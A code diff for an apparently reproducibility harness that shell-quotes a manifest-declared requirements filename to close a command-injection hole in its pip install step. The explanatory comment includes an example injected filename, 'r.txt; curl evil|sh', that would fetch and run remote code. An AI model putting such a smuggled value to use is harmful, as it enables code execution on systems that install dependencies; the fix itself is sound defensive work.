@@ -14,6 +14,7 @@ whether the environment was author-specified or harness-default.
 
 from __future__ import annotations
 
+import shlex
 from pathlib import Path
 from typing import Any
 
@@ -113,7 +114,10 @@ def _install_commands(env: dict[str, Any], src: Path, r_needed: bool) -> tuple[l
         warnings.append(f"manifest declares dependencies '{dep}' but the file does not exist; "
                         "auto-detecting instead")
     elif dep.endswith(".txt"):
-        cmds.append(f"pip install --no-input --target=/work/.reprobe_deps -r {dep}")
+        # dep is an untrusted manifest-declared filename later run via `bash -c`;
+        # shell-quote it (POSIX, for the Linux install container) so a name like
+        # `r.txt; curl evil|sh` cannot inject a command into the install phase.
+        cmds.append(f"pip install --no-input --target=/work/.reprobe_deps -r {shlex.quote(dep)}")
     elif dep.endswith("renv.lock"):
         cmds.append(_RENV_RESTORE)
     elif dep.endswith((".yml", ".yaml")):
